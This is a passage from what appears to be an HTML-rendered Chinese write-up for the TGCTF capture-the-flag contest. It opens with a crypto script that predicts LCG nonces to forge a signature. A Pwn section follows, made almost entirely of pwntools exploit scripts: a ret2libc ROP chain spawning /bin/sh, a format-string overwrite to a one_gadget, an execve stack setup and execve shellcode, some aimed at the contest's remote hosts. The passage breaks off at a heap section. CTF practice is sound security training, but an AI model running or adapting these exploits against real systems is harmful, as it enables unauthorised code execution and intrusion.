class="built_in">print</span>(<span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;y = <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ks_p = []</span><br><span class="line">rs = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    data_ = io.recvline().strip().split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">    r = <span class="built_in">int</span>(data_[<span class="number">2</span>][:-<span class="number">1</span>])</span><br><span class="line">    rs.append(r)</span><br><span class="line">    ks = <span class="built_in">eval</span>(<span class="string">b&#x27;&#x27;</span>.join([data_[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">14</span>)]))</span><br><span class="line">    ks_p.append(ks)</span><br><span class="line"></span><br><span class="line">kv = []</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> ks_p:</span><br><span class="line">    k,_ = crt(primes,res)</span><br><span class="line">    kv.append(k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;kv = <span class="subst">&#123;kv&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delta = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(kv)):</span><br><span class="line">    delta.append(kv[i]-kv[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M = Matrix(ZZ,[[delta[<span class="number">0</span>],delta[<span class="number">1</span>],delta[<span class="number">2</span>]],</span><br><span class="line">                [delta[<span class="number">1</span>],delta[<span class="number">2</span>],delta[<span class="number">3</span>]],</span><br><span class="line">                [delta[<span class="number">2</span>],delta[<span class="number">3</span>],delta[<span class="number">4</span>]]])</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[delta[<span class="number">3</span>],delta[<span class="number">4</span>],delta[<span class="number">5</span>]])</span><br><span class="line"></span><br><span class="line">res = M.solve_left(A)</span><br><span class="line">a,b,c = res.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_diff</span>(<span class="params">a, b, c, delta_prev3, delta_prev2, delta_prev1, delta_current</span>):</span><br><span class="line">    delta_pred = a * delta_prev3 + b * delta_prev2 + c * delta_prev1</span><br><span class="line">    <span class="keyword">return</span> delta_pred - delta_current</span><br><span class="line"></span><br><span class="line">diffs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">11</span>):</span><br><span class="line">    delta_prev3 = kv[i-<span class="number">2</span>] - kv[i-<span class="number">3</span>]</span><br><span class="line">    delta_prev2 = kv[i-<span class="number">1</span>] - kv[i-<span class="number">2</span>]</span><br><span class="line">    delta_prev1 = kv[i] - kv[i-<span class="number">1</span>]</span><br><span class="line">    delta_current = kv[i+<span class="number">1</span>] - kv[i]</span><br><span class="line">    diff = compute_diff(a, b, c, delta_prev3, delta_prev2, delta_prev1, delta_current)</span><br><span class="line">    diffs.append(<span class="built_in">abs</span>(diff))</span><br><span class="line"></span><br><span class="line">n_candidate = gcd(diffs)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;候选 n:&quot;</span>, n_candidate)</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">str</span>(n_candidate)[:<span class="built_in">str</span>(n_candidate).index(<span class="string">&#x27;/&#x27;</span>)])</span><br><span class="line"><span class="built_in">print</span>(isPrime(n))</span><br><span class="line">d = (kv[<span class="number">3</span>] - a * kv[<span class="number">0</span>] - b * kv[<span class="number">1</span>] - c * kv[<span class="number">2</span>])%n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;d&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((a * kv[<span class="number">2</span>] + b * kv[<span class="number">3</span>] + c * kv[<span class="number">4</span>]+d)%n == kv[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">lcg = TripleLCG(kv[-<span class="number">3</span>], kv[-<span class="number">2</span>], kv[-<span class="number">1</span>], a, b, c, d, n)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Part 2\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">307</span>):</span><br><span class="line">    <span class="built_in">print</span>(_)</span><br><span class="line">    k = lcg.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">r_list = []</span><br><span class="line">s_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    data = io.recvline().strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    r_list.append(<span class="built_in">int</span>(data[<span class="number">3</span>][:-<span class="number">1</span>]))</span><br><span class="line">    s_list.append(<span class="built_in">int</span>(data[<span class="number">6</span>]))</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">k = lcg.<span class="built_in">next</span>()</span><br><span class="line">x = ((s_list[<span class="number">0</span>]*k-h)*inverse(r_list[<span class="number">0</span>],q)) % q</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">b&quot;1&quot;</span></span><br><span class="line">h1 = bytes_to_long(sha256(msg1).digest())</span><br><span class="line">k1 = lcg.<span class="built_in">next</span>()</span><br><span class="line">x1 = ((s_list[<span class="number">1</span>] * k1 - h1) * inverse(r_list[<span class="number">1</span>], q)) % q</span><br><span class="line"><span class="keyword">assert</span> x == x1</span><br><span class="line"></span><br><span class="line">final_msg = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">h_ = bytes_to_long(sha256(final_msg).digest())</span><br><span class="line">k_ = <span class="number">1</span></span><br><span class="line">r_final = <span class="built_in">pow</span>(g,k_final,p)%q</span><br><span class="line">s_final = ((h_+x*r_final)*inverse(k_final,q))%q</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Part 2\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(r_final))</span><br><span class="line"></span><br><span class="line">io.recvline(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(s_final))</span><br><span class="line"><span class="comment"># TGCTF&#123;aa8eddd9-df36-1d2c-66b8-f8370013f4cf&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Pwn：">Pwn：</h2>
<h3 id="签到">签到</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401176</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;name.\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span> + <span class="title function_">fit</span>(pop_rdi_ret, elf.<span class="property">got</span>[<span class="string">&#x27;puts&#x27;</span>], elf.<span class="property">plt</span>[<span class="string">&#x27;puts&#x27;</span>], elf.<span class="property">sym</span>[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line"></span><br><span class="line">    libc.<span class="property">address</span> = <span class="title function_">u64</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + b<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.<span class="property">sym</span>[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;libc&#x27;</span>, libc.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;name.\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span> + <span class="title function_">fit</span>(pop_rdi_ret + <span class="number">1</span>, pop_rdi_ret, <span class="title function_">next</span>(libc.<span class="title function_">search</span>(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)), libc.<span class="property">sym</span>[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="fmt">fmt</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x404010</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;gift &#x27;</span>)</span><br><span class="line">    buf_addr = <span class="title function_">int</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;\n&#x27;</span>, drop=<span class="title class_">True</span>), <span class="number">16</span>)</span><br><span class="line">    target = buf_addr - <span class="number">0x8</span></span><br><span class="line">    ret_addr = buf_addr + <span class="number">0x68</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;buf&#x27;</span>, buf_addr)</span><br><span class="line"></span><br><span class="line">    pay = f<span class="string">&#x27;%19$p%&#123;0x31-14&#125;c%8$hhn&#x27;</span>.<span class="title function_">encode</span>().<span class="title function_">ljust</span>(<span class="number">0x10</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pay += <span class="title function_">p64</span>(target)</span><br><span class="line">    <span class="title function_">sa</span>(<span class="string">&quot;name\n&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    libc.<span class="property">address</span> = <span class="title function_">int</span>(p.<span class="title function_">recvn</span>(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    one = libc.<span class="property">address</span> + <span class="number">0xe3b01</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;libc&#x27;</span>, libc.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    pay = f<span class="string">&#x27;%&#123;0x31&#125;c%10$hhn%&#123;(one &amp; 0xffff) - 0x31&#125;c%11$hn&#x27;</span>.<span class="title function_">encode</span>().<span class="title function_">ljust</span>(<span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pay += <span class="title function_">p64</span>(target) + <span class="title function_">p64</span>(ret_addr)</span><br><span class="line">    <span class="title function_">sa</span>(<span class="string">&quot;name\n&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    pay = f<span class="string">&#x27;%&#123;0x31&#125;c%10$hhn%&#123;((one &gt;&gt; 16) &amp; 0xffff) - 0x31&#125;c%11$hn&#x27;</span>.<span class="title function_">encode</span>().<span class="title function_">ljust</span>(<span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pay += <span class="title function_">p64</span>(target) + <span class="title function_">p64</span>(ret_addr + <span class="number">2</span>)</span><br><span class="line">    <span class="title function_">sa</span>(<span class="string">&quot;name\n&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x401299&quot;</span>)</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;name\n&#x27;</span>, b<span class="string">&#x27;win\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="stack">stack</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;30393&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x40</span> + <span class="title function_">fit</span>(<span class="number">0x3b</span>, <span class="number">0x404108</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;say?\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x40</span> + <span class="title function_">fit</span>(<span class="number">0x404060</span>, <span class="number">0</span>)</span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x401229&quot;</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="shellcode">shellcode</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node2.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31114&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;strength \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="title function_">asm</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">mov al, 0x3b</span></span><br><span class="line"><span class="string">add rdi, 10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pay = shellcode.<span class="title function_">ljust</span>(<span class="number">10</span>, b<span class="string">&#x27;\x90&#x27;</span>) + b<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *$rebase(0x1212)&quot;</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="heap">heap</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 